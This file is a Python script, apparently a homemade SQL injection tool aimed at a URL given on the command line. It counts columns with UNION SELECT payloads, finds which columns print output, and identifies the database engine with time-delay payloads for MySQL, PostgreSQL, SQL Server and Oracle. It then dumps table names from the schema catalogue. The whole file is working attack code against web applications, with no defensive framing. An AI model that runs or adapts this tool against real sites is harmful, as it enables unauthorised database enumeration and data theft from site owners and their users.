import sys
import requests
from bs4 import BeautifulSoup
import random
import string
import re


def get_columns():
    for i in range(1, 30):
        query=",".join(["NULL"] * (i))
        response = requests.get(f"{url}'+UNION+SELECT+{query}--+-")
        #print(f"Coulmn Count: {i} {response.status_code}")
        if response.status_code == 200:
           return i
    return -1



def find_printable_column_num():
    printable=[]
    # Loop through the columns
    for i in range(0,num_columns):
        # Build the columns for the SELECT statement
        columns = []
        columns.append(",".join(["NULL"] * (i)))
        columns.append("'a'")
        columns.append(",".join(["NULL"] * (num_columns-1 - i)))
        columns = filter(None, columns)  # remove empty strings
        columns = ",".join(columns)

        # Send the SQL injection request
        response = requests.get(url + "'+UNION+SELECT+" + columns + "--+-").status_code
        if response == 200:
           printable.append(i)
    return printable



def enum_dbms():
    # Try different payloads for different DBMS
    payloads = {
        "MySQL": "1' OR SLEEP(3) -- ",
        "PostgreSQL": "1'; SELECT pg_sleep(3) -- ",
        "Microsoft SQL Server": "1'; IF @@VERSION LIKE '%Microsoft%', WAITFOR DELAY '0:0:3' -- ",
        "Oracle": "1' AND DBMS_LOCK.SLEEP(3) -- "
    }

    for dbms, payload in payloads.items():
        # Send the SQL injection request
        response = requests.get(url + payload).elapsed.total_seconds()

        if response >= 3:
            return dbms



def send_query(payload):
   query=(f"{url}+AND+1=0'+UNION+SELECT+*+FROM+({payload})+myquery--+-")
   print(query)
   return requests.get(query)



def get_tables():
    columns = prepare_columns("table_name")

    if dbms == "Oracle":
        return send_query(f"SELECT+{columns}+FROM+all_tables")
    elif dbms== "PostgreSQL" or dbms == "Microsoft SQL Server" or dbms== "MySQL":
        return send_query(f"SELECT+{columns}+FROM+information_schema.tables")
    else:
        return "Failed to enumerate table names"


def prepare_columns(mycolumn):
    r = []
    r.append(",".join(["NULL"] * (printable_column_num[0])))
    r.append(mycolumn)
    r.append(",".join(["NULL"] * (num_columns-1 - printable_column_num[0])))
    r = filter(None, r)  # remove empty strings
    return ",".join(r)


if len(sys.argv) < 2:
    print("Please provide a URL with GET-Parameter=")
    print("e.g: http://192.168.93.1/webshop/admin_users.php?s=")
    sys.exit(1)

url = sys.argv[1]
print("\nTesting connection")
if requests.get(url).status_code == 200:
    print("Connection...ok")
else:
    print("Connection...failed")
    sys.exit(1)

print("Checking for Basic Union Query injection")
print("\nTesting SQL columns")
num_columns=get_columns()
printable_column_num=find_printable_column_num()
print(f"Columns_num: {num_columns}")
print(f"Printable column_num: {printable_column_num}")
#check_column_string_capability()
dbms = enum_dbms()
print(f"The web application is running {dbms}.")
print(get_tables().text)


